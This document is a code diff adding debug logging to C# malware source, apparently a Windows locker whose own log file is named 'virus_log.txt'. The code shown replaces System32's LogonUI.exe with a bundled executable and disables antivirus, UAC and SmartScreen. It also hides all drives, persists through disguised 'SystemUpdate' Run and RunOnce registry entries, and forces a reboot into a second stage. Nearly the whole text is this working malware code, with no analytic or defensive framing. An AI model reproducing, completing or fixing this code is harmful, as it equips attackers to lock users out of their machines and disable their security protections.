@@ -16,41 +16,67 @@ namespace LogonUIInstaller
         private static Mutex mutex;
         private static string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";
         private static string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
+        private static string logPath = @"C:\Windows\Temp\virus_log.txt";
+
+        private static void Log(string msg)
+        {
+            try { File.AppendAllText(logPath, $"{DateTime.Now:HH:mm:ss} - {msg}\n"); } catch { }
+        }
 
         [STAThread]
         static void Main(string[] args)
         {
+            Log("=== ЗАПУСК ===");
+            Log($"Аргументы: {string.Join(" ", args)}");
+
             bool createdNew;
             mutex = new Mutex(true, "Global\\LogonUIInstallerMutex", out createdNew);
-            if (!createdNew) return;
+            if (!createdNew) { Log("Мьютекс уже занят, выход"); return; }
 
             try
             {
                 if (args.Length > 0 && args[0] == "stage2")
                 {
+                    Log("СТАДИЯ 2: Запуск формы");
                     Application.EnableVisualStyles();
                     Application.SetCompatibleTextRenderingDefault(false);
 
+                    Log("Замена LogonUI...");
                     ReplaceLogonUI();
+                    Log("LogonUI заменён");
 
-                    // ЗАПУСК ФОРМЫ КАК В NoSleep
+                    Log("Создание и запуск формы...");
                     Application.Run(new MainInterface());
+                    Log("Форма завершена");
                     return;
                 }
 
+                Log("СТАДИЯ 1: Установщик");
                 if (!IsElevated())
                 {
+                    Log("Нет прав администратора, перезапуск с runas");
                     RestartAsAdmin();
                     return;
                 }
 
+                Log("Распаковка ресурсов...");
                 ExtractAllResources();
+                Log("Ресурсы распакованы");
+
+                Log("Применение блокировок...");
                 ApplySystemBlocks();
                 DisableAntivirusAndUAC();
                 ReplaceWallpaperAndCursors();
                 ReplaceUserAccount();
                 AddToStartupWithStage2();
+                Log("Блокировки применены");
+
+                Log("Перезагрузка...");
                 ForceReboot();
+            }
+            catch (Exception ex)
+            {
+                Log($"ОШИБКА: {ex.Message}\n{ex.StackTrace}");
             }
             finally
             {
@@ -79,7 +105,7 @@ namespace LogonUIInstaller
                 foreach (string file in Directory.GetFiles(appDataPath))
                     File.SetAttributes(file, FileAttributes.Hidden | FileAttributes.ReadOnly);
             }
-            catch { }
+            catch (Exception ex) { Log($"Ошибка распаковки: {ex.Message}"); }
         }
 
         private static void ExtractResource(string name, string outputPath)
@@ -88,13 +114,14 @@ namespace LogonUIInstaller
             {
                 using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
                 {
-                    if (stream == null) return;
+                    if (stream == null) { Log($"Ресурс {name} не найден"); return; }
                     byte[] data = new byte[stream.Length];
                     stream.Read(data, 0, data.Length);
                     File.WriteAllBytes(outputPath, data);
+                    Log($"Распакован {name} -> {outputPath}");
                 }
             }
-            catch { }
+            catch (Exception ex) { Log($"Ошибка распаковки {name}: {ex.Message}"); }
         }
 
         // ==================== ЗАМЕНА LogonUI ====================
@@ -103,7 +130,7 @@ namespace LogonUIInstaller
             try
             {
                 string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
-                if (!File.Exists(originalPath)) return;
+                if (!File.Exists(originalPath)) { Log("LogonUI.exe не найден"); return; }
 
                 ForceFullAccess(originalPath);
                 KillLogonUIProcesses();
@@ -131,8 +158,9 @@ namespace LogonUIInstaller
 
                 byte[] customLogonUI = ExtractResourceBytes("LogonUI.exe");
                 File.WriteAllBytes(originalPath, customLogonUI);
+                Log("LogonUI.exe заменён");
             }
-            catch { }
+            catch (Exception ex) { Log($"Ошибка замены LogonUI: {ex.Message}"); }
         }
 
         private static byte[] ExtractResourceBytes(string resourceName)
@@ -308,7 +336,7 @@ namespace LogonUIInstaller
                     key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                 }
             }
-            catch { }
+            catch (Exception ex) { Log($"Ошибка ApplySystemBlocks: {ex.Message}"); }
         }
 
         private static void DisableAntivirusAndUAC()
@@ -328,7 +356,7 @@ namespace LogonUIInstaller
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                     key.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
             }
-            catch { }
+            catch (Exception ex) { Log($"Ошибка DisableAntivirusAndUAC: {ex.Message}"); }
         }
 
         private static void ReplaceWallpaperAndCursors()
@@ -372,7 +400,7 @@ namespace LogonUIInstaller
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                     key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
             }
-            catch { }
+            catch (Exception ex) { Log($"Ошибка ReplaceWallpaperAndCursors: {ex.Message}"); }
         }
 
         private static void ReplaceUserAccount()
@@ -414,7 +442,7 @@ namespace LogonUIInstaller
                     key.SetValue("Logoff", $"shutdown /l /f /t 0", RegistryValueKind.String);
                 }
             }
-            catch { }
+            catch (Exception ex) { Log($"Ошибка ReplaceUserAccount: {ex.Message}"); }
         }
 
         private static void AddToStartupWithStage2()
@@ -429,6 +457,7 @@ namespace LogonUIInstaller
                 if (File.Exists(selfPath) && !File.Exists(destPath))
                 {
                     File.Copy(selfPath, destPath, true);
+                    Log($"Скопирован в {destPath}");
                 }
 
                 File.SetAttributes(destPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
@@ -440,8 +469,9 @@ namespace LogonUIInstaller
                     key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
                     key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
+                Log("Автозагрузка добавлена");
             }
-            catch { }
+            catch (Exception ex) { Log($"Ошибка AddToStartupWithStage2: {ex.Message}"); }
         }
     }
 }
